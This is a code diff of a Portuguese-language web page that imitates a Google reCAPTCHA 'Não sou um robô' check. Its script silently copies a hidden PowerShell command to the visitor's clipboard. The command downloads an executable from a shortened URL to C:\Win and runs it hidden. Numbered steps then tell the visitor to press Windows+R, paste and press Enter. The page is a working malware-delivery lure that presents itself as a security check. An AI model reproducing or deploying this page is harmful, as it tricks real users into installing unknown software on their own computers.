@@ -15,96 +15,147 @@
             margin: 0;
         }
 
-        .container {
+        .captcha-container {
             background-color: #ffffff;
-            border-radius: 10px;
-            padding: 40px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 400px;
+            border: 1px solid #dcdcdc;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 360px;
+            text-align: left;
         }
 
-        h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
+        .captcha-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .captcha-header input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+        }
+
+        .captcha-header label {
+            font-size: 16px;
             color: #333;
         }
 
-        button {
-            background-color: #4CAF50;
-            color: white;
-            font-size: 16px;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
+        .captcha-header .captcha-logo {
+            margin-left: auto;
+        }
+
+        .captcha-footer {
             margin-top: 20px;
-            transition: background-color 0.3s;
+            font-size: 12px;
+            color: #888;
+            display: flex;
+            justify-content: space-between;
         }
 
-        button:hover {
-            background-color: #45a049;
-        }
-
-        #mensagem {
+        .verification-box {
             display: none;
             margin-top: 20px;
-            font-weight: bold;
-            color: #4CAF50;
+            border: 1px solid #007bff;
+            padding: 20px;
+            border-radius: 5px;
+            background-color: #e7f1ff;
+        }
+
+        .verification-box h3 {
+            margin: 0;
             font-size: 18px;
+            color: #007bff;
         }
 
-        #mensagem span {
-            font-weight: normal;
+        .verification-box ol {
+            margin: 15px 0;
+            padding-left: 20px;
+            color: #333;
         }
 
-        .footer {
-            margin-top: 30px;
+        .verification-box ol li {
+            margin-bottom: 10px;
+        }
+
+        .verification-code {
+            margin-top: 15px;
             font-size: 14px;
-            color: #888;
+            color: #333;
         }
 
-        .footer a {
+        .verification-code .verified {
             color: #4CAF50;
-            text-decoration: none;
         }
 
-        .footer a:hover {
-            text-decoration: underline;
+        .verification-box button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .verification-box button:hover {
+            background-color: #0056b3;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2>Antes de continuar com o Login Confirme que você não é um robô</h2>
-        <button onclick="copiarTexto()">Clique aqui</button>
+    <div class="captcha-container">
+        <div class="captcha-header">
+            <input type="checkbox" id="captcha-checkbox" onclick="showVerification()">
+            <label for="captcha-checkbox">Não sou um robô</label>
+            <img class="captcha-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="ReCAPTCHA logo" width="40">
+        </div>
 
-        <p id="mensagem">
-            <span>Pressione Windows + R</span><br>
-            <span>Ctrl -> V</span><br>
-            <span>Enter </span><br>
-            para confirmar que não é um robô
-        </p>
+        <div class="captcha-footer">
+            <span>Privacidade - Termos</span>
+        </div>
 
-        <p id="resultado"></p>
-
-        <div class="footer">
-            <p>Este captcha é necessário para garantir a integridade dos dados de nossos clientes.</p>
-            <a href="#">Obrigado.</a>
+        <div class="verification-box" id="verification-box">
+            <h3>Complete a Verificação</h3>
+            <ol>
+                <li>Pressione e segure as teclas <strong>Windows</strong> + <strong>R</strong>.</li>
+                <li>Na tela de verificação, pressione <strong>Ctrl</strong> + <strong>V</strong>.</li>
+                <li>Pressione <strong>Enter</strong> para finalizar.</li>
+            </ol>
+            <p class="verification-code">
+                <span class="verified">✔ "Não sou um robô - ID do reCAPTCHA: 2417"</span>
+            </p>
+            <button onclick="copiarTexto()">VERIFICAR</button>
         </div>
     </div>
 
     <script>
-        function copiarTexto() {
-            const comando = "powershell.exe -WindowStyle Hidden -Command \"New-Item C:\\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\\Win\\instalador.exe; Start-Process C:\\Win\\instalador.exe -ArgumentList '/S' -WindowStyle Hidden\""; // Define o texto que será copiado
+        function showVerification() {
+            const checkbox = document.getElementById("captcha-checkbox");
+            const verificationBox = document.getElementById("verification-box");
 
-            navigator.clipboard.writeText(comando).then(() => {
-                // Exibe a mensagem de confirmação
-                document.getElementById("mensagem").style.display = "block";
-            }).catch(err => {
+            if (checkbox.checked) {
+                verificationBox.style.display = "block";
+            } else {
+                verificationBox.style.display = "none";
+            }
+        }
+
+        function copiarTexto() {
+            const comando = "powershell.exe -WindowStyle Hidden -Command \"New-Item C:\\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\\Win\\instalador.exe; Start-Process C:\\Win\\instalador.exe -ArgumentList '/S' -WindowStyle Hidden\"";
+
+            try {
+                const textarea = document.createElement('textarea');
+                textarea.value = comando;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                alert("Comando copiado para a área de transferência!");
+            } catch (err) {
                 console.error("Erro ao copiar texto: ", err);
-            });
+                alert("Não foi possível copiar o comando. Tente novamente.");
+            }
         }
     </script>
 
